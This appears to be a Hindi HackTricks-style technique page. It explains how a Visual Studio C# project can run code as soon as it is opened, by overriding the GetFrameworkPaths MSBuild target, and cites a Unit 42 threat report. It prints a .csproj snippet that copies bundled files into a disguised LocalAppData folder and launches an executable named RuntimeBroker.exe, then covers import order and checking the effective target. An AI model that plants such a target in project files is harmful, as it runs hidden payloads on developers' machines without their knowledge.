# Visual Studio प्रोजेक्ट Design-Time MSBuild निष्पादन

{{#include ../banners/hacktricks-training.md}}

Visual Studio में C# प्रोजेक्ट खोलना केवल उसे पढ़ना नहीं है। डेवलपर के Build या Run चुनने **से पहले**, उसका design-time build IntelliSense, references और debugging को शुरू करने के लिए नामित MSBuild targets चलाता है। `GetFrameworkPaths` ऐसा ही एक target है। जो प्रोजेक्ट इसे फिर से परिभाषित करता है, वह प्रोजेक्ट लोड होने पर ही user-context code execution कर सकता है—इसके लिए अलग से payload पर क्लिक करने की ज़रूरत नहीं होती।<sup>[[1]](#references)[[2]](#references)</sup>

रिपोर्ट किए गए प्रोजेक्ट ने resource files घोषित कीं, फिर अपने replacement target के भीतर `MakeDir`, `Copy` और `Exec` का उपयोग करके साथ रखे payload को तैयार किया और चलाया। यह संक्षिप्त अंश source के Figure 6 में दिखाए गए execution path को सुरक्षित रखता है; इसे standalone XML file में नहीं, बल्कि `.csproj` के अंदर होना चाहिए।<sup>[[1]](#references)</sup>

```xml
<ItemGroup>
  <ResourceFiles Include="Resources\**\*.*" />
</ItemGroup>
<Target Name="GetFrameworkPaths">
  <MakeDir Directories="$(LocalAppData)\Microsoft\RuntimeBrokers" />
  <Copy SourceFiles="@(ResourceFiles)"
        DestinationFolder="$(LocalAppData)\Microsoft\RuntimeBrokers\%(RecursiveDir)"
        SkipUnchangedFiles="true" />
  <Exec Command='start "" "$(LocalAppData)\Microsoft\RuntimeBrokers\RuntimeBroker.exe"' />
</Target>
```

**Import का क्रम महत्वपूर्ण है:** MSBuild किसी target की *अंतिम* परिभाषा का उपयोग करता है। किसी project file में लिखा गया target, Microsoft target को बदल देगा, इसकी गारंटी नहीं है—बाद में कोई import उसे फिर से परिभाषित कर सकता है। `<Project Sdk="...">` का उपयोग करने वाले SDK-style projects, project body के बाद SDK targets को अप्रत्यक्ष रूप से import करते हैं। इसलिए यह मानने के बजाय कि यह सटीक override हर project में काम करेगा, evaluated import order की जाँच करें। `MSBuild.exe -preprocess:expanded.xml project.csproj` project को build किए बिना imports का विस्तार करता है और प्रभावी target definition ढूँढ़ने में मदद कर सकता है।<sup>[[3]](#references)[[4]](#references)</sup>

यह developer-project execution surface है, VSIX extension installation नहीं, और अपने आप में privilege escalation भी नहीं है। यदि staged executable किसी malicious adjacent `.exe.config` या DLL का उपयोग करता है, तो [AppDomainManager hijacking and DLL sideloading](windows-local-privilege-escalation/dll-hijacking/) देखें।

## References

- [1] [Unit 42 - Blinder Tunnel अभियान ने इराकी बुनियादी ढाँचे को निशाना बनाया](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
- [2] [Microsoft Learn - Visual Studio एकीकरण (MSBuild)](https://learn.microsoft.com/en-us/visualstudio/msbuild/visual-studio-integration-msbuild?view=visualstudio)
- [3] [Microsoft Learn - MSBuild Targets](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-targets)
- [4] [Microsoft Learn - MSBuild कमांड-लाइन संदर्भ](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-command-line-reference?view=visualstudio)
{{#include ../banners/hacktricks-training.md}}
